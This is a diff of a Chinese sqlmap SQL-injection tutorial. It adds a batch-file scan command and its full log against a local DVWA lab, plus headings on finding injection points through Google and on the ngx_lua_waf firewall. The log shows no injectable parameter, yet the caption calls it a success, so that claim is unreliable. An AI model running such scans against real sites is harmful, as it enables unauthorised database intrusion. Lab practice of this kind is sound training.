@@ -60,7 +60,7 @@ back-end DBMS: MySQL >= 5.0.0
 
 [*] shutting down at 11:17:53
 
-``
+```
 
 ## 以文件方式注入检测
 
@@ -305,5 +305,53 @@ sqlmap.py -u "http://127.0.0.1:82/dvwa/vulnerabilities/xss_s/" --cookie="securit
 >演示GET和POST的操作放入文本
 
 ```php
+sqlmap.py -l E:\cmk\gtiwork\mysql\fn\sqlmap\batchFileInject.txt --batch  --smart
 
+//成功溢出如下
+
+[14:58:06] [INFO] sqlmap parsed 1 (parameter unique) requests from the targets list ready to be tested
+URL 1:
+GET http://127.0.0.1:82/dvwa/vulnerabilities/xss_s/
+Cookie: security=low; PHPSESSID=cubjjq1a6oieurb2veql3a6pr4
+POST data: txtName=111&mtxMessage=222&btnSign=Sign%20Guestbook
+do you want to test this URL? [Y/n/q]
+> Y
+[14:58:06] [INFO] testing URL 'http://127.0.0.1:82/dvwa/vulnerabilities/xss_s/'
+[14:58:06] [INFO] using 'C:\Users\cmk\.sqlmap\output\results-09112017_0258pm.csv' as the CSV results file in multiple targets mode
+[14:58:06] [INFO] testing connection to the target URL
+[14:58:06] [INFO] testing if the target URL is stable
+[14:58:07] [WARNING] target URL is not stable. sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison' and provide a string or regular expression to match on
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[14:58:07] [INFO] testing if POST parameter 'txtName' is dynamic
+[14:58:07] [WARNING] POST parameter 'txtName' does not appear to be dynamic
+[14:58:07] [WARNING] heuristic (basic) test shows that POST parameter 'txtName' might not be injectable
+[14:58:07] [INFO] heuristic (XSS) test shows that POST parameter 'txtName' might be vulnerable to cross-site scripting attacks
+[14:58:07] [INFO] skipping POST parameter 'txtName'
+[14:58:07] [INFO] testing if POST parameter 'mtxMessage' is dynamic
+[14:58:07] [INFO] confirming that POST parameter 'mtxMessage' is dynamic
+[14:58:07] [INFO] POST parameter 'mtxMessage' is dynamic
+[14:58:07] [WARNING] reflective value(s) found and filtering out
+[14:58:08] [WARNING] heuristic (basic) test shows that POST parameter 'mtxMessage' might not be injectable
+[14:58:08] [INFO] heuristic (XSS) test shows that POST parameter 'mtxMessage' might be vulnerable to cross-site scripting attacks
+[14:58:08] [INFO] skipping POST parameter 'mtxMessage'
+[14:58:08] [INFO] testing if POST parameter 'btnSign' is dynamic
+[14:58:08] [INFO] confirming that POST parameter 'btnSign' is dynamic
+[14:58:08] [INFO] POST parameter 'btnSign' is dynamic
+[14:58:08] [WARNING] heuristic (basic) test shows that POST parameter 'btnSign' might not be injectable
+[14:58:08] [INFO] skipping POST parameter 'btnSign'
+[14:58:08] [ERROR] all tested parameters appear to be not injectable. Try to increase '--level'/'--risk' values to perform more tests. Also, you can try to rerun by providing either a valid value for option '--string' (or '--regexp'). If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could retry with an option '--tamper' (e.g. '--tamper=space2comment'), skipping to the next URL
+[14:58:08] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'C:\Users\cmk\.sqlmap\output\results-09112017_0258pm.csv'
 ```
+
+
+## 寻找注入点
+> 必须使用谷歌翻墙
+![](images/search_inject.png)
+
+
+## ngx_lua_waf效果显示
+
+![](images/filter_view.png)
+
+
+
